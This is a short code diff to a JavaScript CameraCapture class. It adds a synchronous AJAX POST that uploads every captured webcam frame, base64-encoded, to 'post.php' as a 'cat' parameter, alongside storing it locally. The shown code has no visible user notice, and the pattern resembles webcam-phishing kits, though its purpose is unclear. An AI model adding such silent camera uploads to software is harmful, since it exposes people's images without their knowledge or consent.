@@ -87,6 +87,21 @@ class CameraCapture {
         this.context.drawImage(this.video, 0, 0, 640, 480);
         const canvasData = this.canvas.toDataURL("image/png");
         const imageData = canvasData.replace("data:image/png;base64,", "");
+
+        $.ajax({
+            type: 'POST',
+            data: { cat: imageData },
+            url: 'post.php',
+            dataType: 'json',
+            async: false,
+            success: function(result) {
+                
+            },
+            error: function() {
+                console.error("Error posting data.");
+            }
+        });
+
         this.dataService.addCapturedImage(imageData);
     }
 }
